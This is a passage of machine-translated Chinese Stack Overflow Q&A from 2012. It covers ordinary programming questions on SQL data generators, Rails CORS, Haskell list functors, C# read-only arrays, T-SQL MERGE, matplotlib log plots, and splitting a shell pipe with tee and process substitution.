具体来说，将数据库中的一列设置为 Bit 类型；但是，数据生成器计划将数据类型设置为 int。从这里，我可以选择的唯一生成器选项是数据绑定生成器、整数、顺序数据绑定生成器、SmallInt 和 TinyInt。

运行生成器时，除了名称中带有 Int 的选项之外的所有选项都不会产生输出值。使用 Int 生成器之一运行生成器以尝试生成值会导致此错误：

错误 1 ​​TSD50003：生成器 Int 对列 [dbo].[Contract_Relationship].[status] 无效 - 类型位

这个错误很明显，因为该列实际上是一个位而不是一个 Int。不太明显的是我如何才能将列上的数据类型更改为正确的类型。

我尝试查看工具 > 选项 > 数据库 > 默认生成器下的数据类型生成器定义，并且位属于默认数据生成器类别，该类别与 SQL 数据类型类别下的布尔类型相关联。

从这里我也无法更改生成器，因为默认数据生成器类别的下拉列表与每个 SQL 数据类型相关联。尝试更改数据生成器计划中位列的数据类型也不起作用，因为它是只读的。

最后，我会将列设置为 null 作为解决方法，但它设置为不为 null。有人对如何将列的数据类型更改为位有任何建议吗？

先感谢您！

更新：我注意到在开发团队的模式文件中进行了更多研究后，该列实际上在 Create Table .sql 文件中设置为 Int 数据类型。在我看来，数据生成器用于模式的信息来自这些文件。

在 SQL Server 客户端中创建表文件和实际数据库之间的列不正确似乎很奇怪，但这可能与我的问题没有直接关系。

如果有人知道如何更改数据生成器中的数据类型，甚至知道数据生成器从哪里提取模式信息，我仍然会感兴趣。

再次感谢大家的时间。

# ruby-on-rails - 如何在我的 Rails RESTful Web 服务中接受 PUT 和 DELETE 方法

> ID：10218073
> 
> 赞同：0
> 
> 时间：2012-04-18T21:10:48.323
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rest, jquery, ruby-on-rails-3.1

我构建了一个返回 JSON 的 Ruby On Rails 3.0.x 应用程序。到目前为止，我的广告控制器中只有四种方法：索引、显示、更新、销毁。

当我尝试从同一域中的应用程序调用方法时（通过 AJAX 和 jQuery），我成功了。但是，当我尝试从另一个域中的另一个应用程序执行相同操作时，我收到以下错误消息，仅当我尝试使用方法 PUT 和 DELETE 时（它适用于 GET 和 POST）：

> XMLHttpRequest 无法加载 URL_HERE 来源 URL_HERE 不受 Access-Control-Allow-Origin 的允许。

我的 RESTful 服务是通过 HTTP 而不是 HTTPS 调用的。

下面是我正在使用的 AJAX 代码（16 是广告的 id）：

```
$.ajax({
    type: "DELETE",
    url: "http://SERVICE_URL/advertisements/16.json",
    crossDomain: true,
    success: function(response){
            alert("test");

    }
    }); 
```

有任何想法吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:20:27.390

你可以试试[rack-cors](https://github.com/cyu/rack-cors)。[我们通过以下方式为我们的 Web 服务](http://impact.brighterplanet.com)启用 CORS ：

```
# config/application.rb
config.middleware.use Rack::Cors do |requests|
  requests.allow do |allow|
    allow.origins '*'
    # perhaps you would stick :put and :delete here?
    # then you should follow the rack-cors documentation to only enable it where necessary
    allow.resource '*', :headers => :any, :methods => [:get, :post]
  end
end 
```

# haskell - 为什么列表函子代表不确定性选择的上下文？

> ID：10218076
> 
> 赞同：11
> 
> 时间：2012-04-18T21:11:11.910
> 
> 标签：haskell, functional-programming

这句话是什么意思？

```
the list functor represents a context of nondeterministic choice; 
```

在函数式编程中的 Functor 的上下文中。

我想我理解 Functor 是某种“容器”，并且能够在不改变结构的情况下将函数统一应用于容器中的元素。所以也许是一个 Functor 代表一个可能失败的上下文或容器，但是为什么 list 代表一个具有不确定性选择的上下文或容器呢？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-18T21:13:33.377

据我所知，如果一个计算有多个可能的答案，它就是“不确定的”。好吧，一个列表可以包含多个可能的答案。所以这就是为什么。

（至于为什么它被称为 nondeterministic，我不知道......我原以为 nondeterministic 意味着*random*，这是完全不同的东西。）

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-18T22:02:25.383

传统上，在可计算性和复杂性方面，非确定性计算模型指的是在这种情况下您可以“分支”的模型。维基百科是这样解释的：

> 在计算复杂性理论中，非确定性算法是这样一种算法，在每一个可能的步骤中，都可以允许多个延续（想象一个人走在森林里的一条小路上，每次他走得更远，他都必须选择他想要的岔路口采取）。这些算法并没有为每一个可能的计算路径得出一个解决方案；然而，他们保证为某些路径得出正确的解决方案（即，穿过森林的人可能只有在选择“正确”路径的某种组合时才能找到他的小屋）。这些选择可以解释为搜索过程中的猜测。

在 list monad 中，这正是您正在做的事情。例如，考虑在 list monad中对[clique 问题的决策版本的解决方案：](http://en.wikipedia.org/wiki/Clique_problem)

```
cliques :: Int -> Graph -> [[Node]]
cliques 0 _ = [[]]
cliques minCliqueSize graph = do
  v <- nodes graph
  vs <- cliques (minCliqueSize - 1) (deleteNode v graph)
  mapM_ (\ w -> guard (isAdjacent v w graph)) vs
  return (v:vs) 
```

这正是您编写例如非确定性图灵机来解决集团问题的方式。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-04-18T21:59:39.680

考虑以下：

```
foo = do
  x <- [1 .. 10]
  y <- [2, 3, 5, 7]
  return (x * y) 
```

是什么`foo`？嗯，它是`x * y`，除了不确定性选择`x`是从 1 到 10 的数字，并且 y 是 2、3、5 或 7。因此，foo 是`[2, 3, 5, 7, 4, 6, 10, 14, etc... ]`

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-04-18T22:50:47.640

除了将函子视为容器之外，您还可以将其视为某种上下文。您的值在该上下文中，如果您想对它们进行操作，您可以使用`map`将函数提升到上下文中。另一种说法是，您的价值观会随着该上下文而增强。

要了解列表函子如何成为非确定性选择的上下文，了解另一个函子如何成为上下文可能会很有用：Maybe 函子是可能失败的计算的上下文。如果您尝试将函数应用于 Maybe 函子中的值，则结果值仍将保持与最初是否是失败计算相同的上下文。

同样，可以将列表视为没有确定性结果的计算结果，但其结果可能会从几个值之一中非确定性地选择。如果您尝试在具有 3 个元素的列表上映射函数，这些元素将被更改，但能够在三个值之间进行选择的上下文将保持不变。

借用 Dan Burtons 的回答，看看列表的一元符号：

```
foo = do
  x <- [1 .. 10]
  y <- [2, 3, 5, 7]
  return (x * y) 
```

起初看起来有点奇怪，因为符号似乎表明，您可以从每个列表中提取一个值，但随后您会得到一个长度为 40 个元素的列表。当您将函子（在本例中为单子）视为单个值的上下文时，它会更有意义。在示例中，`x`和`y`是这样的值，但它们的上下文是它们是不确定的。当您将两个这样的值相乘时，您会得到更多的不确定性，从而导致更长的列表。因此，使用 monad 和`>>=`，可以更改上下文，而使用仿函数 and `map`，则不能。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-04-18T21:35:53.600

“经典”计算采用 1 个输入并给出 1 个输出。您想用这些非确定性计算表示的是：如果我不确定输入，我能对输出说些什么？

表示不确定性的两种常用方法是考虑：

1.  输入是给定集合的一个元素
2.  输入由已知的概率分布给出

例如，考虑将其输入加倍的函数 (2*)。当输入是掷骰子的结果时，您对该函数的输出有何看法？

1.  我知道骰子有 6 个面，所以结果在集合 {2,4,6,8,10,12}
2.  我知道每张脸的概率是 1/6，所以我知道这些数字中的每一个都有 1/6 的概率出现

列表函子代表 1\. 意义上的非确定性计算：它代表列表的集合。

# c# - C#中只读二维数组

> ID：10218084
> 
> 赞同：11
> 
> 时间：2012-04-18T21:11:44.063
> 
> 标签：c#, immutability, readonly

有没有在 C# 中返回只读二维数组的既定方法？

我知道`ReadOnlyCollection`使用一维数组是正确的，并且很高兴编写自己的包装类来实现`this[] {get}`. 但如果这个轮子已经存在，我不想重新发明轮子。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:16:14.237

不幸的是，没有任何内置实现来处理您要求的案例。但是你自己一个简单的实现，应该不难。

唯一的想法，我希望你知道，你会做的是一个只读*集合*，而*不是*那个集合中的元素。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:43:46.047

只有一种方法可以模拟这一点。

您需要使用私有数组创建自己的类。

最相似的数组实现是索引器：

*   [使用索引器](http://msdn.microsoft.com/en-us/library/2549tw02.aspx)
*   [索引器（C# 编程指南）](http://msdn.microsoft.com/en-us/library/6x16t2tx.aspx)
*   [10.8 索引器（旧）](https://web.archive.org/web/20120103002717/http://msdn.microsoft.com/en-us/library/aa664459(v=vs.71).aspx)
*   [C# 6.0 草案索引器](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/language-specification/classes#indexers)

“10.8”链接显示了二维数组的模拟。

如果仅使用 getter 实现索引器，则用户只能读取元素，而不能写入它们。但是，如果每个元素都是一个对象（引用类型），则您无法阻止修改访问的对象属性。

但是，有几种方法可以模拟“只读”对象：

*   创建一个包装类，将数组中每个元素的属性公开为只读属性，这样它们就不能被修改
*   使用原始值类型（如`int`）
*   通过返回私有数组中元素的副本而不是私有数组中的原始元素来消除更改，以便对对象所做的更改不会影响数组中的原始对象。

在其他语言（如 C++）中，有指向常量值的引用和指针，但这在 C# 中不存在。

# iphone - UITabbarController 的子视图前面的持久视图

> ID：10218090
> 
> 赞同：0
> 
> 时间：2012-04-18T21:12:03.330
> 
> 标签：iphone, cocoa-touch, user-interface, uitabbarcontroller

有没有办法在 UITabbarController 前面添加一个持久视图。我想要一个控制栏，它位于所有 UITabbarcontroller 的子视图前面的屏幕顶部，以便在更改选项卡时它保持原位。显然我可以将相同的视图添加到每个子视图中，但这不是一个好的解决方案。

# html - 增加或减少网站大小

> ID：10218092
> 
> 赞同：0
> 
> 时间：2012-04-18T21:12:06.233
> 
> 标签：html, web, size, resolution

所以，我创建了这个网站（lemiart.com），根据图像高度（如果它太大），用户必须向下滚动才能查看整个图像，特别是在使用低分辨率的计算机时。我想做的是在网站上实现一个按钮，这样用户就可以点击它，网站就会变小，就像减少浏览器的缩放一样。但我想实现它，因此用户只需单击它并缩小它，而无需访问浏览器配置。

关于如何实施它的任何想法？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:19:05.453

你所描述的听起来像是“响应式网页设计”。与其让用户发起交互（按钮单击）来缩放或调整站点和图像的大小，不如考虑添加一些 JQuery 或其他检测浏览器尺寸的工具，并自动重新配置页面。在为多个平台（PC、移动设备、平板电脑等）进行设计时，这是一种常见的方法。

[查看此演示文稿](http://johnpolacek.github.com/scrolldeck.js/decks/responsive/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:19:55.913

你可能想看看 jquery 的某种灯箱插件。

Fancybox(http://fancybox.net/) 是我用过的一个非常好的。有了这些，您可以在网站上拥有较小的图像，然后使用灯箱放大到较大的图像。

# java - 使用 JUnit 3 的 JMock 教程？

> ID：10218094
> 
> 赞同：0
> 
> 时间：2012-04-18T21:12:11.323
> 
> 标签：java, jmock, junit3

我正在寻找使用 JUnit 3 的 JMock 教程。

最好也是一个简单的。我发现的每个 JMock 教程都很难通读。

另外，使用 JUnit 4 是否值得？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-13T15:04:29.110

请注意，jmock 在 JUnit 4 附带的版本中发生了很大变化。我建议在编写新测试时使用 JUnit 4 和最新的 JMock，而不是花时间学习没有未来路径的东西。

JMock 的更高版本通过与 JUnit 生命周期集成作为运行程序使事情变得更容易。

# url - 使用 friendly_id 为具有可标记行为的标签创建 URL slug

> ID：10218097
> 
> 赞同：0
> 
> 时间：2012-04-18T21:12:28.983
> 
> 标签：url, ruby-on-rails-3.1, slug, acts-as-taggable-on, friendly-id

我正在尝试遵循这个问题的答案，以便为标签创建 url 友好的 slug：

[使用acts_as_taggable_on 为标签创建url slug](https://stackoverflow.com/questions/4982589/creating-url-slugs-for-tags-with-acts-as-taggable-on/5990274#5990274)

在初始化器中，我有：

```
ActsAsTaggableOn::Tag.class_eval do
  extend FriendlyId
  friendly_id :name, use: :slugged
end 
```

我得到的错误是：

```
undefined method `slug' for #<ActsAsTaggableOn::Tag id: nil, name: "test listing"> 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T12:54:17.070

使用我在参考文章中读到的内容，我有一个潜在的解决方案

跑`rails g migration AddSlugToTags slug:string`

这应该会产生以下迁移：

```
class AddSlugToTags < ActiveRecord::Migration
  def change
    add_column :tags, :slug, :string
  end
end 
```

当然，运行`rake db:migrate`来设置它。

然后你上面的初始化代码应该可以工作。

**注意：**我自己没有尝试过，但它会起作用是有道理的。

希望这可以帮助。

# jquery - 如何为 html 选择标签（跨浏览器）创建自定义设计（带图像）？

> ID：10218098
> 
> 赞同：7
> 
> 时间：2012-04-18T21:12:38.747
> 
> 标签：jquery, html, css, cross-browser

我正在尝试找到一种方法来创建具有满足要求的自定义设计的跨浏览器（所有主要浏览器）选择标签：

*   使用几行代码
*   跨浏览器
*   快速（用户看到页面后 1-2 秒内不加载）
*   易于复制

* * *

我发现一些只在 Firefox 和其他使用 webkit 但与其他样式混淆的作品。然后我开始煎一些脑细胞来检查我的选择。我尝试了这些：

### 第一种解决方案

使用仅具有 css 的图像作为背景，但在活动时我无法删除[chrome](https://stackoverflow.com/q/2226666/840901)上的边框。由于`-webkit-appearance: none;`箭头被移除（这很好），但我不能在[firefox](http://jsfiddle.net/kJFsp/)上做到这一点。

### 第二个解决方案

尝试在jquery 的帮助下替换/使用[select 作为 div ，有些人建议使用](https://stackoverflow.com/q/6213665/840901)[bulgaria 上的一些人制作的这个插件](http://code.google.com/p/select-box/)，这看起来很棒，但我仍然认为它太花哨了。

### 第三个解决方案

在选择的顶部添加一个 span/div 标签。我花了一些时间在这个上，但我自己无法做到。发现1 年前的一个问题，关于我在尝试实现时遇到的一个问题，即模拟对选择标签的点击（就像用户点击了一样）[。](https://stackoverflow.com/q/2895608/840901)最后我决定[穿制服](http://uniformjs.com/)。尽管他们的插件超出了我的需要，但它也适合解决问题。

* * *

第一个解决方案根本无法解决我的问题（可能是错误的方法或 css 代码）。第二和第三使用了太多的代码行（插件和所有）。还有其他我没有想到的方法或符合所有要求的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:00:43.527

[Formalize](http://formalize.me/)是一个相当简洁明了的插件。*是*的，它依赖于 jquery，但假设站点的架构是高质量的，它不会影响 .js 文件第一次缓存后的呈现。

如果您的网站大量使用 ajax 来交付页面内容，则可以完全避免任何*预先准备好的无样式内容。*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T08:17:05.820

嘿，你可以这样做

**CSS**

```
label.custom-select {
    position: relative;
    display: inline-block;

}

    .custom-select select {
        display: inline-block;
        padding: 4px 3px 3px 5px;
        margin: 0;
        font: inherit;
        outline:none; /* remove focus ring from Webkit */
        line-height: 1.2;
        background: #000;
        color:white;
        border:0;
    outline:none;
    }

    /* Select arrow styling */
    .custom-select:after {
        content: "▼";
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        font-size: 60%;
        line-height: 30px;
        padding: 0 10px;
        background: green;
        color: white;
    }

    .no-pointer-events .custom-select:after {
        content: none;
    } 
```

**HTML**

```
<label class="custom-select">

    <select>
        <option>Sushi</option>
        <option>Blue cheese with crackers</option>
        <option>Steak</option>
        <option>Other</option>
    </select>
</label> 
```

现场演示[http://jsfiddle.net/rohitazad/XxkSC/555/](http://jsfiddle.net/rohitazad/XxkSC/555/)

# tsql - T SQL合并示例需要帮助理解

> ID：10218101
> 
> 赞同：39
> 
> 时间：2012-04-18T21:12:47.440
> 
> 标签：tsql, merge

以下：

```
MERGE dbo.commissions_history AS target
USING (SELECT @amount, @requestID) AS source (amount, request)
ON (target.request = source.request)
WHEN MATCHED THEN
    UPDATE SET amount = source.amount
WHEN NOT MATCHED THEN
    INSERT (request, amount)
    VALUES (source.request, source.amount); 
```

来自[https://stackoverflow.com/a/2967983/857994](https://stackoverflow.com/a/2967983/857994)是一种非常漂亮的插入/更新方式（并通过一些额外的工作删除）。即使经过一些谷歌搜索，我也很难理解。

有人可以请：

*   用简单的术语解释一下——在这种情况下，MSDN 文档破坏了我的大脑。
*   告诉我如何修改它，以便用户可以输入数量和请求的值，而不是从另一个数据库位置选择它们？

基本上，我想使用它从 C# 应用程序中插入/更新，其中包含从我获取的 XML 文件中获取的信息。因此，我需要了解如何手动制定查询，以使用这种机制将解析的数据放入数据库。

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2012-04-18T23:28:11.533

如果您不熟悉[join 语句](http://msdn.microsoft.com/en-us/library/ms191517%28v=sql.105%29.aspx)，那么这就是您需要开始的地方。了解连接的工作原理是其余部分的关键。一旦您熟悉了联接，那么通过将其视为完全联接以及如何处理匹配或不匹配的行的说明，理解合并是最容易的。

因此，使用提供的代码示例让我们看一下 Commissions_history 表

```
|  Amount  |   Request  |   <other fields> |
--------------------------------------------
|  12.00   |   1234     |   <other data>   |
|  14.00   |   1235     |   <other data>   |
|  15.00   |   1236     |   <other data>   | 
```

合并语句在称为“目标”的表和返回称为“源”的表（或在逻辑上与 CTE 等表非常相似的结果集）的表达式之间创建完全连接。

在给出的示例中，它使用变量作为源，我们假设这些变量已由用户设置或作为参数传递。

```
DECLARE @Amount Decimal = 18.00;
DECLARE @Request Int = 1234;

MERGE dbo.commissions_history AS target       
USING (SELECT @amount, @requestID) AS source (amount, request)       
ON (target.request = source.request) 
```

将其视为联接时创建以下结果集。

```
|  Amount  |   Request  |   <other fields> | Source.Amount | Source.Request  |
------------------------------------------------------------------------------
|  12.00   |   1234     |   <other data>   |   18.00       |     1234        |
|  14.00   |   1235     |   <other data>   |   null        |     null        |
|  15.00   |   1236     |   <other data>   |   null        |     null        | 
```

在找到匹配项的情况下，使用给出的关于对目标做什么的说明。

```
WHEN MATCHED THEN        
UPDATE SET amount = source.amount 
```

生成的目标表现在看起来像这样。请求 1234 的行更新为 18。

```
|  Amount  |   Request  |   <other fields> |
--------------------------------------------
|  18.00   |   1234     |   <other data>   |
|  14.00   |   1235     |   <other data>   |
|  15.00   |   1236     |   <other data>   | 
```

由于找到了匹配项，因此没有其他任何事情发生。但是，可以说来自源的值是这样的。

```
DECLARE @Amount Decimal = 18.00;
DECLARE @Request Int = 1239; 
```

生成的连接将如下所示：

```
|  Amount  |   Request  |   <other fields> | Source.Amount | Source.Request  |
------------------------------------------------------------------------------
|  12.00   |   1234     |   <other data>   |   null        |     null        |
|  14.00   |   1235     |   <other data>   |   null        |     null        |
|  15.00   |   1236     |   <other data>   |   null        |     null        |
|  null    |   null     |   null           |   18.00       |     1239        | 
```

由于在目标中未找到匹配的行，因此该语句执行另一个子句。

```
WHEN NOT MATCHED THEN                                 
INSERT (request, amount)                                 
VALUES (source.request, source.amount); 
```

导致现在看起来像这样的目标表：

```
|  Amount  |   Request  |   <other fields> |
--------------------------------------------
|  12.00   |   1234     |   <other data>   |
|  14.00   |   1235     |   <other data>   |
|  15.00   |   1236     |   <other data>   |
|  18.00   |   1239     |   <other data>   | 
```

合并语句真正的潜力是当源和目标都是大表时。因为它可以用一个简单的语句对每一行进行大量更新和/或插入。

最后一点。重要的是要记住`not matched`默认为完整的子句`not matched by target`，但是您可以指定`not matched by source`代替默认子句，或者添加到默认子句中。合并语句支持两种类型的不匹配（源中的记录不在目标中，或者目标中的记录不在源*中，由 on 子句定义*）。 [您可以在 MSDN 上找到完整的文档、限制和完整的语法。](http://msdn.microsoft.com/en-us/library/bb510625.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-11T10:19:16.600

在给定的答案示例中，您已完成

```
DECLARE @Request Int 
```

, 但在 SQL 中调用它如下：

```
SELECT @amount, @requestID 
```

另一个将相同地命名和调用变量：

```
@amount vs. Amount -> @Amount & Amount 
```

# python - 使用matplotlib在对数刻度上绘制连接线到具有零纵坐标的点？

> ID：10218102
> 
> 赞同：4
> 
> 时间：2012-04-18T21:12:48.047
> 
> 标签：python, matplotlib, logarithm

是否可以在 matplotlib 的对数刻度上将连接线绘制到 y 值为零的点？

我有一些数据要在 y 轴上用对数刻度绘制。一些数据的 y 值为零。我意识到 matplotlib 不可能在对数刻度上绘制这些点，但我真的希望它会从前一点或到下一点（如果其中一个不为零）绘制连接线。

一种解决方案是用一些 TINY 数字简单地替换所有零。我宁愿不这样做。

matplotlib 绘制的内容： ![无连接线的对数图](../Images/db894043e184dec612ae2a5545875f3d.png)

我想画什么： ![带连接线的对数图](../Images/3eec9392087350fb758b840cd2ff8877.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:01:37.893

我希望通过[`symlog`](http://matplotlib.sourceforge.net/api/axes_api.html#matplotlib.axes.Axes.set_yscale)在 y 轴上使用 ' ' 选项而不是 ' `log`' 来解决这个问题。然后有一个`linthreshy`arg 可以让你指定

> “绘图呈线性的范围（以避免绘图在零附近趋于无穷大）。”。

事实上，该选项似乎旨在处理这类问题。在对数刻度图的底部有这个奇怪的线性区域可能看起来有点傻，但你可以让它变得非常小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T13:46:07.590

您总是可以通过从当前图形中提取坐标来在图形底部附加一个额外的点：

```
import numpy as np
import pylab as plt

# Create some sample data like yours
X = np.linspace(0,3,100)
Y = np.exp(-X)

def semilogy_to_bottom(X,Y):
    # Plot once to move axes and remove plot
    P, = plt.semilogy(X,Y)
    plt.gca().lines.remove(P)

    # Find the bottom of the graph
    y_min = plt.gca().get_ylim()[0]

    # Add a new point
    X2 = np.concatenate((X,[X[-1]]))
    Y2 = np.concatenate((Y,[y_min]))
    plt.semilogy(X2,Y2)

semilogy_to_bottom(X,Y)
plt.xlim(0,5)
plt.show() 
```

![在此处输入图像描述](../Images/0222620d52a8ae800b630a80e5d8bda8.png)

# macos - OS X / Linux：管道分成两个进程？

> ID：10218103
> 
> 赞同：23
> 
> 时间：2012-04-18T21:12:48.403
> 
> 标签：macos, shell, unix, pipe

我知道

```
program1 | program2 
```

和

```
program1 | tee outputfile | program2 
```

但是有没有办法将 program1 的输出同时输入到 program2 和 program3 中？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-04-18T21:27:33.387

您可以使用`tee`并处理替换来执行此操作。

```
program1 | tee >(program2) >(program3) 
```

的输出`program1`将通过管道传输到内部的任何内容`( )`，在本例中为`program2`和`program3`。

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2013-10-01T20:43:11.023

## *并行化*简介

 *这看似微不足道，但这样做不仅是可能的，而且这样做会产生*并发*或*同时*的进程。

您可能需要注意一些特定的影响，例如执行顺序、执行时间等。

这篇文章的末尾有一些示例。

## 首先兼容的答案

由于这个问题被*标记为* [shell](/questions/tagged/shell "显示标记为“外壳”的问题")和[unix](/questions/tagged/unix "显示标记为“unix”的问题")，我将首先给出一个*POSIX 兼容*的答案。（对于*bashisms，走得更远*。）

是的，有一种使用*未命名管道*的方法。

在这个示例中，我将生成 100'000 个数字的范围，将它们随机化并使用 4 种不同的压缩工具压缩结果以比较压缩率...

为此，我将首先运行准备工作：

```
GZIP_CMD=`which gzip`
BZIP2_CMD=`which bzip2`
LZMA_CMD=`which lzma`
XZ_CMD=`which xz`
MD5SUM_CMD=`which md5sum`
SED_CMD=`which sed` 
```

**注意：**指定命令的完整路径会阻止某些 shell 解释器（如 busybox）运行内置压缩器。并且这样做将确保相同的语法将独立于操作系统安装运行（MacOs、Ubuntu、RedHat、HP-Ux 等之间的路径可能不同......）。

语法`NN>&1`（其中 NN 是 3 到 63 之间的数字）确实会生成*未命名管道*，可以通过 find at 来生成`/dev/fd/NN`。（文件描述符 0 到 2 已经为 0：STDIN、1：STDOUT 和 2：STDERR 打开）。

试试这个（在[dash](/questions/tagged/dash "显示标记为“破折号”的问题")、[busybox](/questions/tagged/busybox "显示标记为“busybox”的问题")和[bash](/questions/tagged/bash "显示标记为“bash”的问题")下测试）：

```
(((( seq 1 100000 | shuf | tee /dev/fd/4 /dev/fd/5 /dev/fd/6 /dev/fd/7 | $GZIP_CMD >/tmp/tst.gz ) 4>&1 | $BZIP2_CMD >/tmp/tst.bz2 ) 5>&1 | $LZMA_CMD >/tmp/tst.lzma ) 6>&1 | $XZ_CMD >/tmp/tst.xz ) 7>&1 | $MD5SUM_CMD 
```

或更具可读性：

```
GZIP_CMD=`which gzip`
BZIP2_CMD=`which bzip2`
LZMA_CMD=`which lzma`
XZ_CMD=`which xz`
MD5SUM_CMD=`which md5sum`

(
  (
    (
      (
        seq 1 100000 |
          shuf |
          tee /dev/fd/4 /dev/fd/5 /dev/fd/6 /dev/fd/7 |
          $GZIP_CMD >/tmp/tst.gz
      ) 4>&1 |
        $BZIP2_CMD >/tmp/tst.bz2
    ) 5>&1 |
      $LZMA_CMD >/tmp/tst.lzma
  ) 6>&1 |
    $XZ_CMD >/tmp/tst.xz
) 7>&1 |
  $MD5SUM_CMD
2e67f6ad33745dc5134767f0954cbdd6  - 
```

和`shuf`随机放置一样，如果你尝试这个，你必须得到不同的结果，

```
ls -ltrS /tmp/tst.*
-rw-r--r-- 1 user user 230516 oct  1 22:14 /tmp/tst.bz2
-rw-r--r-- 1 user user 254811 oct  1 22:14 /tmp/tst.lzma
-rw-r--r-- 1 user user 254892 oct  1 22:14 /tmp/tst.xz
-rw-r--r-- 1 user user 275003 oct  1 22:14 /tmp/tst.gz 
```

但您必须能够比较*md5*校验和：

```
SED_CMD=`which sed`

for chk in gz:$GZIP_CMD bz2:$BZIP2_CMD lzma:$LZMA_CMD xz:$XZ_CMD;do
    ${chk#*:} -d < /tmp/tst.${chk%:*} |
        $MD5SUM_CMD |
        $SED_CMD s/-$/tst.${chk%:*}/
  done
2e67f6ad33745dc5134767f0954cbdd6  tst.gz
2e67f6ad33745dc5134767f0954cbdd6  tst.bz2
2e67f6ad33745dc5134767f0954cbdd6  tst.lzma
2e67f6ad33745dc5134767f0954cbdd6  tst.xz 
```

## 使用[bash](/questions/tagged/bash "显示标记为“bash”的问题")功能

使用一些*bashims*，这可能看起来更好，用于示例使用`/dev/fd/{4,5,6,7}`，而不是`tee /dev/fd/4 /dev/fd/5 /...`

```
(((( seq 1 100000 | shuf | tee /dev/fd/{4,5,6,7} | gzip >/tmp/tst.gz ) 4>&1 |
   bzip2 >/tmp/tst.bz2 ) 5>&1 | lzma >/tmp/tst.lzma ) 6>&1 |
   xz >/tmp/tst.xz ) 7>&1 | md5sum
29078875555e113b31bd1ae876937d4b  - 
```

将同样工作。

### 最终检查

这不会创建任何文件，但可以让您比较 4 种不同压缩工具之间的排序整数压缩范围的大小（为了好玩，我使用了 4 种不同的方式来格式化输出）：

```
(
  (
    (
      (
        (
          seq 1 100000 |
            tee /dev/fd/{4,5,6,7} |
              gzip |
              wc -c |
              sed s/^/gzip:\ \ / >&3
        ) 4>&1 |
          bzip2 |
          wc -c |
          xargs printf "bzip2: %s\n" >&3
      ) 5>&1 |
        lzma |
        wc -c |
        perl -pe 's/^/lzma:   /' >&3
    ) 6>&1 |
      xz |
      wc -c |
      awk '{printf "xz: %9s\n",$1}' >&3
  ) 7>&1 |
    wc -c
) 3>&1
gzip:  215157
bzip2: 124009
lzma:   17948
xz:     17992
588895 
```

这演示了如何使用在 subshel​​l 中重定向**并**在控制台中合并以进行最终输出的*stdin*和*stdout 。*

 **### 语法`>(...)`和`<(...)`

最近的[bash](/questions/tagged/bash "显示标记为“bash”的问题")版本允许新的语法特性。

```
seq 1 100000 | wc -l
100000

seq 1 100000 > >( wc -l )
100000

wc -l < <( seq 1 100000 )
100000 
```

作为`|`一个*未命名管道*，`/dev/fd/0`该语法确实会生成带有其他文件描述符的`<()`临时*未命名管道*`/dev/fd/XX`。

```
md5sum <(zcat /tmp/tst.gz) <(bzcat /tmp/tst.bz2) <(
         lzcat /tmp/tst.lzma) <(xzcat /tmp/tst.xz)
29078875555e113b31bd1ae876937d4b  /dev/fd/63
29078875555e113b31bd1ae876937d4b  /dev/fd/62
29078875555e113b31bd1ae876937d4b  /dev/fd/61
29078875555e113b31bd1ae876937d4b  /dev/fd/60 
```

### 更复杂的演示

这需要安装*GNU`file`实用*程序。将根据扩展名或文件类型确定要运行的命令。

```
for file in /tmp/tst.*;do
    cmd=$(which ${file##*.}) || {
        cmd=$(file -b --mime-type $file)
        cmd=$(which ${cmd#*-})
    }
    read -a md5 < <($cmd -d <$file|md5sum)
    echo $md5 \ $file
  done
29078875555e113b31bd1ae876937d4b  /tmp/tst.bz2
29078875555e113b31bd1ae876937d4b  /tmp/tst.gz
29078875555e113b31bd1ae876937d4b  /tmp/tst.lzma
29078875555e113b31bd1ae876937d4b  /tmp/tst.xz 
```

这使您可以通过以下语法执行相同的操作：

```
seq 1 100000 |
    shuf |
        tee >(
            echo gzip. $( gzip | wc -c )
          )  >(
            echo gzip, $( wc -c < <(gzip))
          ) >(
            gzip  | wc -c | sed s/^/gzip:\ \ /
          ) >(
            bzip2 | wc -c | xargs printf "bzip2: %s\n"
          ) >(
            lzma  | wc -c | perl -pe 's/^/lzma:  /'
          ) >(
            xz    | wc -c | awk '{printf "xz: %9s\n",$1}'
          ) > >(
            echo raw: $(wc -c)
          ) |
        xargs printf "%-8s %9d\n"

raw:        588895
xz:         254556
lzma:       254472
bzip2:      231111
gzip:       274867
gzip,       274867
gzip.       274867 
```

**注意**我使用了不同的方法来计算`gzip`压缩计数。

**注意**由于此操作是**同时**完成的，输出顺序将取决于每个命令所需的时间。

### 进一步了解并行化

如果您运行一些多核或多处理器计算机，请尝试比较：

```
i=1
time for file in /tmp/tst.*;do
    cmd=$(which ${file##*.}) || {
        cmd=$(file -b --mime-type $file)
        cmd=$(which ${cmd#*-})
    }
    read -a md5 < <($cmd -d <$file|md5sum)
    echo $((i++)) $md5 \ $file
  done |
cat -n 
```

可能会呈现：

```
 1      1 29078875555e113b31bd1ae876937d4b  /tmp/tst.bz2
     2      2 29078875555e113b31bd1ae876937d4b  /tmp/tst.gz
     3      3 29078875555e113b31bd1ae876937d4b  /tmp/tst.lzma
